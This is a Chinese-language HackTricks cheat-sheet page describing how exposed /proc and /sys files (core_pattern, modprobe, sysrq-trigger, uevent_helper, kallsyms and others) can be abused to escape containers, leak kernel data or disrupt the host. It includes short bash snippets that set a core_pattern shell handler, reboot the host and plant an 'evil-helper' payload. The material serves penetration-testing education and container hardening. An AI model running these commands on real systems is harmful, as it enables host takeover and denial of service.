<details>

<summary><strong>零基础学习AWS黑客技术直至成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


(_**此信息取自**_ [_**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**_](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts))

由于缺乏命名空间支持，暴露`/proc`和`/sys`提供了大量的攻击面和信息泄露源。`procfs`和`sysfs`中的许多文件存在容器逃逸、主机修改或基本信息泄露的风险，这些泄露可能有助于其他攻击。

为了滥用这些技术，可能仅仅需要**配置错误，例如`-v /proc:/host/proc`**，因为**AppArmor是基于路径的**，不保护`/host/proc`。

# procfs

## /proc/sys

`/proc/sys`通常允许访问并修改内核变量，通常通过`sysctl(2)`控制。

### /proc/sys/kernel/core\_pattern

[/proc/sys/kernel/core\_pattern](https://man7.org/linux/man-pages/man5/core.5.html)定义了在生成核心文件（通常是程序崩溃）时执行的程序，并且如果该文件的第一个字符是管道符号`|`，则将核心文件作为标准输入传递。该程序由root用户运行，并允许最多128字节的命令行参数。这将允许在容器主机中轻松执行代码，只要发生任何崩溃和核心文件生成（在众多恶意行为中可以简单地丢弃）。
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes #For testing
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern
sleep 5 && ./crash &
```
### /proc/sys/kernel/modprobe

[/proc/sys/kernel/modprobe](https://man7.org/linux/man-pages/man5/proc.5.html) 包含内核模块加载器的路径，当加载内核模块时会调用它，例如通过 [modprobe](https://man7.org/linux/man-pages/man8/modprobe.8.html) 命令。可以通过执行任何将触发内核尝试加载内核模块的操作（例如使用 crypto-API 加载当前未加载的加密模块，或使用 ifconfig 为当前未使用的设备加载网络模块）来获得代码执行能力。
```bash
# Check if you can directly access modprobe
ls -l `cat /proc/sys/kernel/modprobe`
```
### /proc/sys/vm/panic\_on\_oom

[/proc/sys/vm/panic\_on\_oom](https://man7.org/linux/man-pages/man5/proc.5.html) 是一个全局标志，用于确定内核在遇到内存不足（OOM）条件时是否会发生panic（而不是调用OOM killer）。这更像是一种拒绝服务（DoS）攻击，而不是容器逃逸，但它同样暴露了一个只应该由宿主机可用的能力。

### /proc/sys/fs

[/proc/sys/fs](https://man7.org/linux/man-pages/man5/proc.5.html) 目录包含了关于文件系统各个方面的选项和信息的数组，包括配额、文件句柄、inode和dentry信息。对这个目录具有写权限将允许对宿主机进行各种拒绝服务攻击。

### /proc/sys/fs/binfmt\_misc

[/proc/sys/fs/binfmt\_misc](https://man7.org/linux/man-pages/man5/proc.5.html) 允许执行各种二进制格式，这通常意味着可以为非本地二进制格式（如Java）注册各种**解释器**，基于它们的魔数。你可以通过注册处理程序使内核执行二进制文件。\
你可以在 [https://github.com/toffan/binfmt\_misc](https://github.com/toffan/binfmt\_misc) 找到一个利用程序：_穷人的rootkit，利用_ [_binfmt\_misc_](https://github.com/torvalds/linux/raw/master/Documentation/admin-guide/binfmt-misc.rst)_的_ [_credentials_](https://github.com/torvalds/linux/blame/3bdb5971ffc6e87362787c770353eb3e54b7af30/Documentation/binfmt\_misc.txt#L62) _选项通过任何suid二进制文件（并获得root shell）提升权限，如果`/proc/sys/fs/binfmt_misc/register`是可写的。_

要更深入了解这项技术，请查看 [https://www.youtube.com/watch?v=WBC7hhgMvQQ](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

## /proc/config.gz

[/proc/config.gz](https://man7.org/linux/man-pages/man5/proc.5.html) 取决于`CONFIG_IKCONFIG_PROC`设置，这会暴露一个压缩版的运行中内核的配置选项。这可能允许被破坏或恶意的容器轻松发现并针对内核中启用的脆弱区域。

## /proc/sysrq-trigger

`Sysrq` 是一个古老的机制，可以通过特殊的 `SysRq` 键盘组合来调用。这可以允许立即重启系统、发出 `sync(2)`、将所有文件系统重新挂载为只读、调用内核调试器以及其他操作。

如果客户端没有得到适当隔离，它可以通过向 `/proc/sysrq-trigger` 文件写入字符来触发 [sysrq](https://www.kernel.org/doc/html/v4.11/admin-guide/sysrq.html) 命令。
```bash
# Reboot the host
echo b > /proc/sysrq-trigger
```
## /proc/kmsg

[/proc/kmsg](https://man7.org/linux/man-pages/man5/proc.5.html) 可以暴露内核环形缓冲区消息，通常通过 `dmesg` 访问。暴露这些信息可以帮助内核漏洞利用，触发内核地址泄露（这可以帮助击败内核地址空间布局随机化（KASLR）），并且是关于内核、硬件、被阻止的数据包和其他系统细节的一般信息泄露源。

## /proc/kallsyms

[/proc/kallsyms](https://man7.org/linux/man-pages/man5/proc.5.html) 包含内核导出符号及其地址位置的列表，用于动态和可加载模块。这还包括物理内存中内核映像的位置，这对于内核漏洞开发很有帮助。从这些位置，可以找到内核的基地址或偏移量，这可以用来克服内核地址空间布局随机化（KASLR）。

对于 `kptr_restrict` 设置为 `1` 或 `2` 的系统，这个文件将存在但不提供任何地址信息（尽管符号列表的顺序与内存中的顺序相同）。

## /proc/\[pid]/mem

[/proc/\[pid\]/mem](https://man7.org/linux/man-pages/man5/proc.5.html) 暴露了内核内存设备 `/dev/mem` 的接口。虽然 PID 命名空间可能保护免受某些攻击，但这个 `procfs` 向量历史上一直很脆弱，后来被认为是安全的，但又被发现对于权限提升是[脆弱的](https://git.zx2c4.com/CVE-2012-0056/about/)。

## /proc/kcore

[/proc/kcore](https://man7.org/linux/man-pages/man5/proc.5.html) 代表系统的物理内存，并且是以 ELF 核心格式（通常在核心转储文件中找到）。它不允许写入上述内存。能够读取此文件（限于特权用户）可能会泄露来自宿主系统和其他容器的内存内容。

报告的大文件大小代表了架构的最大物理可寻址内存量，当读取它时可能会导致问题（或根据软件的脆弱性导致崩溃）。

[在 2019 年转储 /proc/kcore](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)

## /proc/kmem

`/proc/kmem` 是 [/dev/kmem](https://man7.org/linux/man-pages/man4/kmem.4.html)（其直接访问被 cgroup 设备白名单阻止）的另一个接口，它是一个代表内核虚拟内存的字符设备文件。它允许读写，允许直接修改内核内存。

## /proc/mem

`/proc/mem` 是 [/dev/mem](https://man7.org/linux/man-pages/man4/kmem.4.html)（其直接访问被 cgroup 设备白名单阻止）的另一个接口，它是一个代表系统物理内存的字符设备文件。它允许读写，允许修改所有内存。（它比 `kmem` 需要更多的技巧，因为需要先将虚拟地址解析为物理地址）。

## /proc/sched\_debug

`/proc/sched_debug` 是一个特殊文件，返回整个系统的进程调度信息。这些信息包括来自所有命名空间的进程名称和进程 ID 以及进程 cgroup 标识符。这有效地绕过了 PID 命名空间保护，并且是其他/世界可读的，因此也可以在非特权容器中利用。

## /proc/\[pid]/mountinfo

[/proc/\[pid\]/mountinfo](https://man7.org/linux/man-pages/man5/proc.5.html) 包含进程的挂载命名空间中的挂载点信息。它暴露了容器 `rootfs` 或镜像的位置。

# sysfs

## /sys/kernel/uevent\_helper

`uevents` 是内核在添加或移除设备时触发的事件。值得注意的是，通过写入 `/sys/kernel/uevent_helper` 可以修改 `uevent_helper` 的路径。然后，当触发 `uevent` 时（这也可以通过写入如 `/sys/class/mem/null/uevent` 等文件从用户空间完成），恶意的 `uevent_helper` 将被执行。
```bash
# Creates a payload
cat "#!/bin/sh" > /evil-helper
cat "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets uevent_helper to /path/payload
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Triggers a uevent
echo change > /sys/class/mem/null/uevent
# or else
# echo /sbin/poweroff > /sys/kernel/uevent_helper
# Reads the output
cat /output
```
## /sys/class/thermal

访问ACPI和各种硬件温度控制设置，通常在笔记本电脑或游戏主板中找到。这可能允许对容器宿主进行DoS攻击，甚至可能导致物理损坏。

## /sys/kernel/vmcoreinfo

该文件可以泄露内核地址，这可能用于击败KASLR。

## /sys/kernel/security

在`/sys/kernel/security`挂载了`securityfs`接口，它允许配置Linux安全模块。这允许配置[AppArmor策略](https://gitlab.com/apparmor/apparmor/-/wikis/Kernel\_interfaces#securityfs-syskernelsecurityapparmor)，因此访问这个可能允许容器禁用其MAC系统。

## /sys/firmware/efi/vars

`/sys/firmware/efi/vars`暴露了与EFI变量在NVRAM中交互的接口。虽然这对大多数服务器来说通常不相关，但EFI变得越来越流行。权限弱点甚至导致了一些笔记本电脑变砖。

## /sys/firmware/efi/efivars

`/sys/firmware/efi/efivars`提供了一个接口，用于写入用于UEFI启动参数的NVRAM。修改它们可能会使宿主机无法启动。

## /sys/kernel/debug

`debugfs`提供了一个“无规则”接口，内核（或内核模块）可以通过它创建用户空间可访问的调试接口。它过去有过一些安全问题，文件系统背后的“无规则”指导原则经常与安全限制发生冲突。

# 参考资料

* [理解和加固Linux容器](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [滥用特权和非特权Linux容器](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
